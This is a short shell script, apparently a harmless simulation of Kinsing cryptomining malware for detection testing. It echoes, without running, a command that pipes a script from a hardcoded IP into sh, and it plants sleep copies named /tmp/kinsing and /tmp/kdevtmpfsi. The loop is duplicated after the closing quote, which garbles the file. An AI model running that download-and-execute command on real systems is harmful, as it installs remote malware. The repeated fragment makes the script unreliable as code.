-c "echo "Starting Kinsing simulation..."
# Mimic kinsing behavior: download a script, then a binary, then run it.
while true; do
  echo "[$(date)] curl http://195.3.146.118/kinsing.sh | sh"
  # Create a fake binary
  cp /bin/sleep /tmp/kinsing
  chmod +x /tmp/kinsing
  echo "[$(date)] Running /tmp/kinsing..."
  /tmp/kinsing 30 &
  
  sleep 5
  
  echo "[$(date)] Starting cryptominer /tmp/kdevtmpfsi..."
  cp /bin/sleep /tmp/kdevtmpfsi
  chmod +x /tmp/kdevtmpfsi
  /tmp/kdevtmpfsi 20 &
  
  wait
  sleep 60
done
"

  echo "[$(date)] curl http://195.3.146.118/kinsing.sh | sh"
  # Create a fake binary
  cp /bin/sleep /tmp/kinsing
  chmod +x /tmp/kinsing
  echo "[$(date)] Running /tmp/kinsing..."
  /tmp/kinsing 30 &
  
  sleep 5
  
  echo "[$(date)] Starting cryptominer /tmp/kdevtmpfsi..."
  cp /bin/sleep /tmp/kdevtmpfsi
  chmod +x /tmp/kdevtmpfsi
  /tmp/kdevtmpfsi 20 &
  
  wait
  sleep 60
done
"
